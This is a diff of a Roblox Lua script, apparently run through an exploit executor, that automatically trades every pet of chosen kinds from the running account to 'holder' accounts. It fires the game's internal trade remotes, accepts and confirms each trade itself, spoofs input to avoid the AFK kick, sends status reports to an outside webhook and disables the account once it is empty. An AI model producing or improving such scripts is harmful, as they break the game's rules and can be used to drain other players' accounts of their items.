@@ -1,15 +1,25 @@
 --[[
-    SUCCESS Auto-Trade Script - SIMPLIFIED
-    Trades ALL pets (normal, neon, mega) of specified kinds to holder
-    v3.0.0
+    SUCCESS Auto-Trade Script - FIXED
+    Trades ALL pets (normal, neon, mega) with proper completion detection
+    v3.1.0 - Added anti-AFK and better trade monitoring
 ]]
 
 repeat wait() until game:IsLoaded()
+
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
 local playerName = LocalPlayer.Name
+
+-- ============== ANTI-AFK ==============
+local VirtualUser = game:GetService("VirtualUser")
+LocalPlayer.Idled:Connect(function()
+    VirtualUser:CaptureController()
+    VirtualUser:ClickButton2(Vector2.new())
+    print("🔄 Anti-AFK triggered")
+end)
+print("✅ Anti-AFK enabled")
 
 local Data = require(ReplicatedStorage.ClientModules.Core.ClientData)
 
@@ -28,8 +38,8 @@ local trade_status = false
 local completedTrades = {}
 
 print("===========================================")
-print("  SUCCESS Auto-Trade System v3.0.0")
-print("  Trades ALL pets of specified kinds")
+print("  SUCCESS Auto-Trade System v3.1.0")
+print("  With Anti-AFK & Better Trade Detection")
 print("===========================================")
 
 -- Dehash
@@ -103,119 +113,162 @@ local function send_trade(username)
     return true
 end
 
-local function add_items_in_trade(unique)
-    ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AddItemToOffer"):FireServer(unique)
+local function add_pet_to_trade(unique_id)
+    ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AddItemToOffer"):FireServer(unique_id)
 end
 
--- Get ALL pets of specified kinds (normal, neon, mega - everything!)
+-- Get ALL pets matching specified kinds
 local function get_all_pets()
-    local foundPets = {}
-    local playerData = Data.get_data()[playerName]
+    local all_pets = {}
     
-    if not playerData or not playerData.inventory or not playerData.inventory.pets then
-        warn("No pet data found")
-        return foundPets
-    end
-    
-    print("\n🔍 Searching for pets...")
-    print("Target pet kinds: " .. table.concat(config.pets_to_trade, ", "))
-    print("---")
-    
-    local normalCount = 0
-    local neonCount = 0
-    local megaCount = 0
-    
-    for _, pet in pairs(playerData.inventory.pets) do
-        -- Check if this pet matches any of the specified kinds
-        for _, petKind in pairs(config.pets_to_trade) do
-            if pet.kind == petKind then
-                -- Get pet properties
-                local is_neon = pet.properties and pet.properties.neon
-                local is_mega = pet.properties and pet.properties.mega
-                
-                -- Add to trade list (ALL types!)
-                table.insert(foundPets, pet.unique)
-                
-                -- Count by type for logging
-                if is_mega then
-                    megaCount = megaCount + 1
-                    print(string.format("✅ Found MEGA %s", pet.kind))
-                elseif is_neon then
-                    neonCount = neonCount + 1
-                    print(string.format("✅ Found NEON %s", pet.kind))
-                else
-                    normalCount = normalCount + 1
-                    print(string.format("✅ Found NORMAL %s", pet.kind))
+    pcall(function()
+        local playerData = Data.get_data()[playerName]
+        if not playerData or not playerData.inventory or not playerData.inventory.pets then
+            return
+        end
+        
+        for _, pet in pairs(playerData.inventory.pets) do
+            for _, targetKind in ipairs(config.pets_to_trade) do
+                if pet.kind == targetKind then
+                    table.insert(all_pets, pet.unique)
+                    break
                 end
-                
-                break -- Don't check other pet kinds once matched
             end
         end
-    end
+    end)
     
-    print("---")
-    print(string.format("📊 Total found: %d pets", #foundPets))
-    print(string.format("   Normal: %d | Neon: %d | Mega: %d", normalCount, neonCount, megaCount))
-    
-    return foundPets
+    return all_pets
 end
 
--- Main auto trade function
+-- Count pets in inventory
+local function count_pets_in_inventory()
+    local count = 0
+    pcall(function()
+        local playerData = Data.get_data()[playerName]
+        if playerData and playerData.inventory and playerData.inventory.pets then
+            for _, pet in pairs(playerData.inventory.pets) do
+                for _, targetKind in ipairs(config.pets_to_trade) do
+                    if pet.kind == targetKind then
+                        count = count + 1
+                        break
+                    end
+                end
+            end
+        end
+    end)
+    return count
+end
+
+-- Auto-trade with better completion detection
 local function autotrade(username)
-    local tradeGui = LocalPlayer.PlayerGui:WaitForChild("TradeApp").Frame
+    if trade_status then
+        return false
+    end
     
-    -- Phase 1: Send trade request
-    if #pets_unique_ids > 0 and not tradeGui.Visible then
-        trade_status = false
-        local success = send_trade(username)
-        if not success then
+    if #pets_unique_ids == 0 then
+        print("No pets left to trade")
+        return true
+    end
+    
+    pcall(function()
+        trade_status = true
+        
+        -- Count pets BEFORE trade
+        local pets_before = count_pets_in_inventory()
+        print(string.format("📦 Pets in inventory before trade: %d", pets_before))
+        
+        local tradeGui = LocalPlayer.PlayerGui:WaitForChild("TradeApp").Frame
+        
+        -- Send trade request
+        if not send_trade(username) then
+            trade_status = false
             return false
         end
-        print(string.format("📤 Trade request sent to %s", username))
-        task.wait(2)
-    
-    -- Phase 2: Add items to trade
-    elseif not trade_status and tradeGui.Visible then
-        local counter = 0
-        local maxSlots = math.min(#pets_unique_ids, 18) -- Max 18 pets per trade
         
-        print(string.format("Adding %d pets to trade...", maxSlots))
+        print("📤 Trade request sent to " .. username)
+        task.wait(3)
         
-        while #pets_unique_ids > 0 and counter < maxSlots do
-            local petUnique = table.remove(pets_unique_ids, 1)
-            add_items_in_trade(petUnique)
-            counter = counter + 1
+        -- Wait for trade window to open
+        local timeout = 0
+        while not tradeGui.Visible and timeout < 15 do
             task.wait(0.5)
+            timeout = timeout + 0.5
         end
         
-        print(string.format("✅ Added %d pets | Remaining: %d", counter, #pets_unique_ids))
-        trade_status = true
-        task.wait(1)
-    
-    -- Phase 3: Accept and confirm trade
-    elseif trade_status and tradeGui.Visible then
-        task.wait(1)
+        if timeout >= 15 then
+            warn("❌ Trade window didn't open")
+            trade_status = false
+            return false
+        end
+        
+        print("✅ Trade window opened")
+        
+        -- Add pets (max 18 per trade)
+        local pets_to_add = math.min(#pets_unique_ids, 18)
+        print(string.format("📦 Adding %d pets to trade...", pets_to_add))
+        
+        for i = 1, pets_to_add do
+            if pets_unique_ids[i] then
+                add_pet_to_trade(pets_unique_ids[i])
+                print(string.format("   Added pet %d/%d", i, pets_to_add))
+                task.wait(0.3)
+            end
+        end
+        
+        print("✅ All pets added to trade")
+        task.wait(1.5)
+        
+        -- Accept trade
         first_trade_accept()
         print("✅ Trade accepted")
         task.wait(1.5)
+        
+        -- Confirm trade
         confirm_trade()
         print("✅ Trade confirmed")
         
-        -- Wait for trade to close
-        local timeout = 0
-        repeat
+        -- Wait for trade to ACTUALLY close (increased timeout)
+        print("⏳ Waiting for trade to complete...")
+        timeout = 0
+        local max_wait = 30 -- 30 seconds max
+        
+        while tradeGui.Visible and timeout < max_wait do
             task.wait(0.5)
             timeout = timeout + 0.5
-        until not tradeGui.Visible or timeout > 10
-        
-        if timeout > 10 then
-            warn("Trade timeout")
-            return false
+            
+            if timeout % 5 == 0 then
+                print(string.format("   Still waiting... (%d seconds)", timeout))
+            end
         end
         
+        if timeout >= max_wait then
+            warn("⚠️ Trade took too long, but checking anyway...")
+        end
+        
+        -- Additional wait for game to update inventory
         task.wait(2)
+        
+        -- Count pets AFTER trade
+        local pets_after = count_pets_in_inventory()
+        local pets_actually_traded = pets_before - pets_after
+        
+        print(string.format("📦 Pets in inventory after trade: %d", pets_after))
+        print(string.format("✅ Actually traded: %d pets", pets_actually_traded))
+        
+        if pets_actually_traded > 0 then
+            -- Remove traded pets from list
+            for i = 1, pets_actually_traded do
+                table.remove(pets_unique_ids, 1)
+            end
+            print(string.format("📋 Remaining pets to trade: %d", #pets_unique_ids))
+        else
+            warn("⚠️ No pets were actually traded! Possible trade failure")
+            -- Refresh pet list in case
+            pets_unique_ids = get_all_pets()
+        end
+        
         trade_status = false
-    end
+    end)
     
     return true
 end
@@ -249,70 +302,76 @@ for index, username in ipairs(config.usernames) do
         continue
     end
     
-    print(string.format("\n✅ Found %d total pets to trade", #pets_unique_ids))
+    local initial_pet_count = #pets_unique_ids
+    print(string.format("\n✅ Found %d total pets to trade", initial_pet_count))
     
     -- Execute trades
-    local totalTraded = #pets_unique_ids
     local tradesNeeded = math.ceil(#pets_unique_ids / 18)
+    print(string.format("🔄 Will need approximately %d trade(s)...\n", tradesNeeded))
     
-    print(string.format("🔄 Executing %d trade(s)...\n", tradesNeeded))
+    local tradeAttempts = 0
+    local maxTrades = tradesNeeded + 5 -- Allow some retry trades
     
-    for tradeNum = 1, tradesNeeded do
-        print(string.format("Trade %d/%d:", tradeNum, tradesNeeded))
+    while #pets_unique_ids > 0 and tradeAttempts < maxTrades do
+        tradeAttempts = tradeAttempts + 1
         
-        local attempts = 0
-        local maxAttempts = 50
+        print(string.format("\n=== Trade Attempt %d ===", tradeAttempts))
         
-        repeat
-            local success = autotrade(username)
-            if not success and attempts > 10 then
-                warn("Trade failed after multiple attempts")
-                break
-            end
-            task.wait(1)
-            attempts = attempts + 1
-        until #pets_unique_ids == 0 or not Players:FindFirstChild(username) or attempts >= maxAttempts
-        
-        -- Check if holder left
+        -- Check if holder still in server
         if not Players:FindFirstChild(username) then
             warn(string.format("⚠️ %s left the game!", username))
-            sendWebhook(string.format("⚠️ %s - Incomplete - Player Left (Traded: %d)", username, totalTraded - #pets_unique_ids))
+            local traded_so_far = initial_pet_count - #pets_unique_ids
+            sendWebhook(string.format("⚠️ %s - Incomplete - Player Left (Traded: %d/%d)", username, traded_so_far, initial_pet_count))
             break
         end
         
-        if attempts >= maxAttempts then
-            warn("Max attempts reached")
-            sendWebhook(string.format("❌ %s - Failed - Max Attempts (Traded: %d)", username, totalTraded - #pets_unique_ids))
-            break
-        end
+        local success = autotrade(username)
         
-        task.wait(3) -- Cooldown between trades
+        if not success then
+            warn("Trade attempt failed, retrying...")
+            task.wait(3)
+        else
+            task.wait(3) -- Cooldown between successful trades
+        end
     end
     
     -- Log completion
+    local traded_count = initial_pet_count - #pets_unique_ids
+    
     if #pets_unique_ids == 0 then
-        print(string.format("\n✅ Successfully traded %d pets with %s", totalTraded, username))
-        sendWebhook(string.format("✅ %s - COMPLETE - Traded: %d pets", username, totalTraded))
+        print(string.format("\n✅ Successfully traded ALL %d pets with %s", traded_count, username))
+        sendWebhook(string.format("✅ %s - COMPLETE - Traded: %d pets", username, traded_count))
         table.insert(completedTrades, username)
-        totalPetsTraded = totalPetsTraded + totalTraded
+        totalPetsTraded = totalPetsTraded + traded_count
+    else
+        warn(string.format("\n⚠️ Partial trade: %d/%d pets traded to %s", traded_count, initial_pet_count, username))
+        sendWebhook(string.format("⚠️ %s - PARTIAL - Traded: %d/%d pets", username, traded_count, initial_pet_count))
+        totalPetsTraded = totalPetsTraded + traded_count
     end
     
     task.wait(5) -- Cooldown before next holder
 end
 
 print("\n┌────────────────────────────────────┐")
-print("│ 🎉 All Trades Completed!           │")
+print("│ 🎉 Trading Session Complete!       │")
 print(string.format("│ ✅ Success: %d/%d holders", #completedTrades, #config.usernames))
 print(string.format("│ ✅ Total Pets Traded: %d", totalPetsTraded))
 print("└────────────────────────────────────┘\n")
 
 -- Final webhook
-sendWebhook(string.format("✅ %s - ALL COMPLETE - Total Traded: %d pets", playerName, totalPetsTraded))
+sendWebhook(string.format("✅ %s - SESSION COMPLETE - Total Traded: %d pets", playerName, totalPetsTraded))
 
--- Auto-disable account
-print("🔴 Disabling account...")
-disableAccount()
+-- Only disable if ALL pets are traded
+local remaining_pets = count_pets_in_inventory()
+
+if remaining_pets == 0 then
+    print("🔴 All pets traded - Disabling account...")
+    disableAccount()
+else
+    print(string.format("⚠️ Still have %d pets - NOT disabling account", remaining_pets))
+    sendWebhook(string.format("⚠️ %s - Has %d pets remaining - NOT DISABLED", playerName, remaining_pets))
+end
 
 print("\n========================================")
-print("✅ SCRIPT COMPLETE & ACCOUNT DISABLED")
+print("✅ SCRIPT COMPLETE")
 print("========================================")
